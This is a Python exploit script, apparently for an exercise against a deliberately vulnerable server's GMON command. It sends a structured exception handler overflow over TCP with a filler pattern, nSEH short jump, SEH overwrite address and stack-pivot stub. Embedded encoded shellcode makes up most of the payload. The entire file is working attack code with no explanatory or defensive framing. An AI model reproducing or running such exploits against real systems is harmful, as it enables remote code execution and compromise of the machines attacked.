#!/usr/bin/python3
from pwn import *
import socket
import argparse


def main(ip,port):
    com_socket = tcp_socket(ip,port)  
    #Pull the banner
    banner = com_socket.recv(1024)
    print(banner)
    payload = make_payload()
    print("Sending", len(payload),  "bytes")
    com_socket.send(payload)

def make_payload():
    prepend = b"GMON /.:/"
    buf =  b""
    buf += b"\xb8\xfd\xe4\x71\x2d\xd9\xf6\xd9\x74\x24\xf4\x5b\x31"
    buf += b"\xc9\xb1\x52\x31\x43\x12\x03\x43\x12\x83\x3e\xe0\x93"
    buf += b"\xd8\x3c\x01\xd1\x23\xbc\xd2\xb6\xaa\x59\xe3\xf6\xc9"
    buf += b"\x2a\x54\xc7\x9a\x7e\x59\xac\xcf\x6a\xea\xc0\xc7\x9d"
    buf += b"\x5b\x6e\x3e\x90\x5c\xc3\x02\xb3\xde\x1e\x57\x13\xde"
    buf += b"\xd0\xaa\x52\x27\x0c\x46\x06\xf0\x5a\xf5\xb6\x75\x16"
    buf += b"\xc6\x3d\xc5\xb6\x4e\xa2\x9e\xb9\x7f\x75\x94\xe3\x5f"
    buf += b"\x74\x79\x98\xe9\x6e\x9e\xa5\xa0\x05\x54\x51\x33\xcf"
    buf += b"\xa4\x9a\x98\x2e\x09\x69\xe0\x77\xae\x92\x97\x81\xcc"
    buf += b"\x2f\xa0\x56\xae\xeb\x25\x4c\x08\x7f\x9d\xa8\xa8\xac"
    buf += b"\x78\x3b\xa6\x19\x0e\x63\xab\x9c\xc3\x18\xd7\x15\xe2"
    buf += b"\xce\x51\x6d\xc1\xca\x3a\x35\x68\x4b\xe7\x98\x95\x8b"
    buf += b"\x48\x44\x30\xc0\x65\x91\x49\x8b\xe1\x56\x60\x33\xf2"
    buf += b"\xf0\xf3\x40\xc0\x5f\xa8\xce\x68\x17\x76\x09\x8e\x02"
    buf += b"\xce\x85\x71\xad\x2f\x8c\xb5\xf9\x7f\xa6\x1c\x82\xeb"
    buf += b"\x36\xa0\x57\xbb\x66\x0e\x08\x7c\xd6\xee\xf8\x14\x3c"
    buf += b"\xe1\x27\x04\x3f\x2b\x40\xaf\xba\xbc\xaf\x98\xc5\x7c"
    buf += b"\x58\xdb\xc5\x69\x2c\x52\x23\xfb\x5c\x33\xfc\x94\xc5"
    buf += b"\x1e\x76\x04\x09\xb5\xf3\x06\x81\x3a\x04\xc8\x62\x36"
    buf += b"\x16\xbd\x82\x0d\x44\x68\x9c\xbb\xe0\xf6\x0f\x20\xf0"
    buf += b"\x71\x2c\xff\xa7\xd6\x82\xf6\x2d\xcb\xbd\xa0\x53\x16"
    buf += b"\x5b\x8a\xd7\xcd\x98\x15\xd6\x80\xa5\x31\xc8\x5c\x25"
    buf += b"\x7e\xbc\x30\x70\x28\x6a\xf7\x2a\x9a\xc4\xa1\x81\x74"
    buf += b"\x80\x34\xea\x46\xd6\x38\x27\x31\x36\x88\x9e\x04\x49"
    buf += b"\x25\x77\x81\x32\x5b\xe7\x6e\xe9\xdf\x17\x25\xb3\x76"
    buf += b"\xb0\xe0\x26\xcb\xdd\x12\x9d\x08\xd8\x90\x17\xf1\x1f"
    buf += b"\x88\x52\xf4\x64\x0e\x8f\x84\xf5\xfb\xaf\x3b\xf5\x29"
    pattern = b"A"*3180
    nseh = b"\xeb\x06\x90\x90"
    seh = b"\x5e\x19\x50\x62"
    yeet = b"\x54\x58\x66\x05\x45\x06\xff\xe0"
    buffer_space = 5000 - len(buf) - len(pattern) - len(nseh) - len(seh) - len(yeet)
    print(buffer_space)
    payload_struct = buf + pattern + nseh + seh + yeet+ b'D'*buffer_space
    final_payload = prepend + payload_struct 
    return final_payload

def tcp_socket(ip,port):
    network_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection_tuple = (ip,port)
    network_socket.connect(connection_tuple)
    return network_socket

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', required=True)
    parser.add_argument('--port', required=True, type=int)
    args = parser.parse_args()
    main(args.host,args.port)   
